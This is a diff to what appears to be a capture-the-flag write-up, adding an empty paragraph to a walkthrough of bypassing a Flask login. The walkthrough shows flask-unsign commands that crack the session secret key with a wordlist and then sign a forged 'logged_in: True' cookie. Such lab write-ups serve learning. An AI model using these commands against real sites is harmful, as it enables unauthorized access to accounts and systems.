@@ -17,6 +17,7 @@ I wonder what happens if instead of "logged_in": false we have "logged_in": true
 We see the site uses flask. If we search for flask we see we can use:
 <p> flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval to find the secret key </p>
   and then use this:
+  <p> </p>
   <p> flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' to sign the cookie to be logged in: true but with the secret key. </p>
 <img width="853" alt="image" src="https://user-images.githubusercontent.com/107073731/202767204-982e15d1-0e73-46e0-9cfe-ce8a896b1460.png">
 <p> We find this way that the secret key is password and now we change the cookie to logged in true using the key too  </p>
